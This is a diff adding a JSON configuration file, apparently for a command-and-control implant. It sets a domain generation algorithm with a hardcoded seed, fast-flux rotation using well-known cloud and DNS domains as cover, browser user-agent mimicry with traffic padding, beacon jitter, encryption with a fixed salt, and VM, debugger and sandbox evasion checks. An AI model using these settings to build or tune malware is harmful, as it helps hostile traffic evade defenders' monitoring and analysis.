@@ -1,0 +1,56 @@
+{
+    "dga": {
+        "enabled": false,
+        "seed": "c2_secret_seed_2024",
+        "tlds": [".com", ".org", ".net", ".info", ".biz", ".cc", ".io"],
+        "domain_count": 10,
+        "rotation_hours": 24
+    },
+    
+    "fast_flux": {
+        "enabled": false,
+        "domains": [
+            "cdn.cloudflare.com",
+            "dns.google",
+            "amazonaws.com"
+        ],
+        "rotation_interval": 300,
+        "cache_ttl": 60
+    },
+    
+    "traffic_mimicry": {
+        "enabled": true,
+        "user_agents": [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
+        ],
+        "rotation_interval": 3600,
+        "padding_min": 100,
+        "padding_max": 500,
+        "mimic_responses": true
+    },
+    
+    "jitter": {
+        "enabled": true,
+        "base_interval": 60,
+        "jitter_percent": 0.3,
+        "seed": 12345
+    },
+    
+    "encryption": {
+        "enabled": true,
+        "algorithm": "aes-256-gcm",
+        "key_rotation": 86400,
+        "salt": "c2_salt_2024"
+    },
+    
+    "evasion": {
+        "check_vm": false,
+        "check_debugger": false,
+        "check_sandbox": false,
+        "delay_on_detection": 3600
+    }
+}
